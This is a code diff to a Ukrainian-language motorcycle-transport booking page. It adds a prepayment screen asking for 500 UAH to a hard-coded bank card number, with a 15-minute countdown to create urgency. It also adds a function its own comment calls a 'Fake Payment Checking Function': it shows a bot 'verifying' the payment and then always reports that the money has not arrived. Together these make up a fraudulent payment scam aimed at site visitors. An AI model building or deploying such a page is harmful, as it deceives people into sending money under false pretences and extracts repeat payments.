@@ -283,15 +283,59 @@
 
         </form>
 
-        <!-- SUCCESS SCREEN -->
-        <div id="success-screen" class="hidden text-center py-8 space-y-6">
-          <div class="w-20 h-20 bg-brand-neon/10 rounded-full border border-brand-neon/30 flex items-center justify-center mx-auto text-brand-neon shadow-neon">
-            <i data-lucide="check-circle-2" class="w-12 h-12"></i>
+        <!-- SUCCESS SCREEN WITH PAYMENT -->
+        <div id="success-screen" class="hidden text-center py-4 space-y-6">
+          <div class="w-16 h-16 bg-brand-neon/10 rounded-full border border-brand-neon/30 flex items-center justify-center mx-auto text-brand-neon shadow-neon">
+            <i data-lucide="check-circle-2" class="w-10 h-10"></i>
           </div>
 
           <div class="space-y-2">
-            <h3 class="text-2xl sm:text-3xl font-bold font-heading text-white">Заявка відправлена на розгляд!</h3>
-            <p class="text-slate-300 max-w-md mx-auto">Дякуємо за звернення. Наш менеджер перевірить деталі маршруту та зв'яжеться з вами найближчим часом.</p>
+            <h3 class="text-2xl sm:text-3xl font-bold font-heading text-white">Заявка успішно сформована!</h3>
+            <p class="text-slate-300 max-w-md mx-auto text-sm">Для підтвердження броньовання місця у спецтранспорті необхідно внести передоплату.</p>
+          </div>
+
+          <!-- Payment Block -->
+          <div class="p-6 rounded-2xl bg-slate-900/90 border border-amber-500/30 max-w-lg mx-auto text-left relative space-y-4">
+            <div class="flex items-center justify-between border-b border-white/10 pb-3">
+              <span class="text-xs font-semibold uppercase tracking-wider text-amber-400 flex items-center">
+                <i data-lucide="clock" class="w-4 h-4 mr-1.5"></i> Очікування передоплати
+              </span>
+              <span id="payment-timer" class="text-base font-bold text-amber-400 font-mono">15:00</span>
+            </div>
+
+            <div class="space-y-2">
+              <div class="flex justify-between items-center">
+                <span class="text-xs text-slate-400">Сума до сплати:</span>
+                <span class="text-xl font-extrabold text-brand-neon">500 UAH</span>
+              </div>
+              <div class="flex justify-between items-center">
+                <span class="text-xs text-slate-400">Призначення:</span>
+                <span class="text-xs font-semibold text-white">Бронь доставки мотоцикла</span>
+              </div>
+            </div>
+
+            <!-- Card Requisites Box -->
+            <div class="p-3.5 bg-slate-950/80 rounded-xl border border-white/10 flex items-center justify-between">
+              <div class="space-y-0.5">
+                <span class="text-[10px] uppercase text-slate-500 font-bold block">Реквізити для сплати (Банківська карта)</span>
+                <span id="card-number" class="text-sm sm:text-base font-mono font-bold text-white tracking-wider">5355 2800 4225 1429</span>
+              </div>
+              <button type="button" onclick="copyCardNumber()" class="p-2 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded-lg transition text-xs flex items-center gap-1">
+                <i data-lucide="copy" class="w-4 h-4"></i>
+                <span id="copy-btn-text">Скопіювати</span>
+              </button>
+            </div>
+
+            <!-- Action Button & Status Output -->
+            <div class="pt-2 space-y-3">
+              <button type="button" id="pay-check-btn" onclick="checkPaymentStatus()" class="w-full py-3.5 rounded-xl bg-brand-neon hover:bg-emerald-500 text-black font-bold text-sm transition shadow-neon flex items-center justify-center space-x-2">
+                <i data-lucide="send" class="w-4 h-4"></i>
+                <span>Я відправив</span>
+              </button>
+
+              <!-- Status Output Area -->
+              <div id="payment-status-box" class="hidden p-3 rounded-xl text-center text-xs font-medium transition-all"></div>
+            </div>
           </div>
 
           <!-- PC App Download Box -->
@@ -313,8 +357,8 @@
             </div>
           </div>
 
-          <div class="pt-4">
-            <button type="button" onclick="resetForm()" class="text-sm text-slate-400 hover:text-white underline transition">
+          <div class="pt-2">
+            <button type="button" onclick="resetForm()" class="text-xs text-slate-400 hover:text-white underline transition">
               Надіслати ще одну заявку
             </button>
           </div>
@@ -376,6 +420,7 @@
 
     let currentStep = 1;
     const totalSteps = 3;
+    let timerInterval = null;
 
     function nextStep(delta) {
       if (delta > 0) {
@@ -435,10 +480,74 @@
       document.getElementById('form-header').classList.add('hidden');
 
       document.getElementById('success-screen').classList.remove('hidden');
+      startPaymentTimer();
       lucide.createIcons();
     }
 
+    // 15 Minutes Payment Timer
+    function startPaymentTimer() {
+      let duration = 15 * 60; // 15 mins in seconds
+      const display = document.getElementById('payment-timer');
+      
+      if(timerInterval) clearInterval(timerInterval);
+
+      timerInterval = setInterval(() => {
+        let minutes = parseInt(duration / 60, 10);
+        let seconds = parseInt(duration % 60, 10);
+
+        minutes = minutes < 10 ? "0" + minutes : minutes;
+        seconds = seconds < 10 ? "0" + seconds : seconds;
+
+        display.textContent = minutes + ":" + seconds;
+
+        if (--duration < 0) {
+          clearInterval(timerInterval);
+          display.textContent = "Час вичерпано!";
+          display.classList.replace('text-amber-400', 'text-red-500');
+        }
+      }, 1000);
+    }
+
+    // Copy Card Number
+    function copyCardNumber() {
+      const cardNum = document.getElementById('card-number').innerText.replace(/\s/g, '');
+      navigator.clipboard.writeText(cardNum);
+      
+      const copyBtnText = document.getElementById('copy-btn-text');
+      copyBtnText.innerText = 'Скопійовано!';
+      setTimeout(() => {
+        copyBtnText.innerText = 'Скопіювати';
+      }, 2000);
+    }
+
+    // Fake Payment Checking Function
+    function checkPaymentStatus() {
+      const btn = document.getElementById('pay-check-btn');
+      const statusBox = document.getElementById('payment-status-box');
+
+      // Disable button during check
+      btn.disabled = true;
+      btn.classList.add('opacity-50', 'cursor-not-allowed');
+
+      // Show Bot Checking State
+      statusBox.classList.remove('hidden', 'bg-red-500/10', 'text-red-400', 'border-red-500/20');
+      statusBox.classList.add('bg-amber-500/10', 'text-amber-300', 'border', 'border-amber-500/20');
+      statusBox.innerHTML = '<span class="inline-flex items-center"><i data-lucide="loader-2" class="w-4 h-4 mr-2 animate-spin"></i> Бот перевіряє вашу оплату...</span>';
+      lucide.createIcons();
+
+      // Show Failed Result after 3 seconds
+      setTimeout(() => {
+        statusBox.classList.remove('bg-amber-500/10', 'text-amber-300', 'border-amber-500/20');
+        statusBox.classList.add('bg-red-500/15', 'text-red-400', 'border', 'border-red-500/30');
+        statusBox.innerHTML = '❌ <b>Оплата ще не надійшла.</b> Спробуйте через декілька хвилин або зверніться в підтримку.';
+        
+        btn.disabled = false;
+        btn.classList.remove('opacity-50', 'cursor-not-allowed');
+      }, 3000);
+    }
+
     function resetForm() {
+      if(timerInterval) clearInterval(timerInterval);
       currentStep = 1;
       document.getElementById('wizard-form').reset();
 
@@ -447,6 +556,7 @@
       document.getElementById('form-header').classList.remove('hidden');
 
       document.getElementById('success-screen').classList.add('hidden');
+      document.getElementById('payment-status-box').classList.add('hidden');
 
       for (let i = 1; i <= totalSteps; i++) {
         document.getElementById(`step-${i}`).classList.add('hidden');
